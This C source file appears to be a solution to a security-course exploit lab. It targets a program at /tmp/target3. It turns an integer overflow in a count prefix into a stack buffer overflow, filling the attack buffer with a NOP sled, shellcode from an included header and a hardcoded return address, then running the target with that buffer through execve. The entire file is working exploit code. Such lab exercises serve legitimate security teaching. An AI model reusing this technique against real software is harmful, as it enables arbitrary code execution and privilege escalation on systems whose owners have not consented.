#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  struct widget_t {
    double x;
    double y;
    int count;
  };
  const size_t max_int = 2147483647;

  const int size = 240 * (sizeof(struct widget_t) + 1);
  char attack[size];
  char ret[] = "\xb8\xfc\xff\xbf";
  memset(attack, 0x90, size);

  size_t int_overflow = max_int + 1; // we are at zero
  int_overflow += size / sizeof(struct widget_t); // let's add what some bytes to overflow over ebp and ret
  
  snprintf(attack, 11, "%u", int_overflow);
  memcpy(attack + 10, ",", 1);
  memcpy(attack + size - 49, shellcode, 45);
  memcpy(attack + size - 4, ret, 4);
  
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
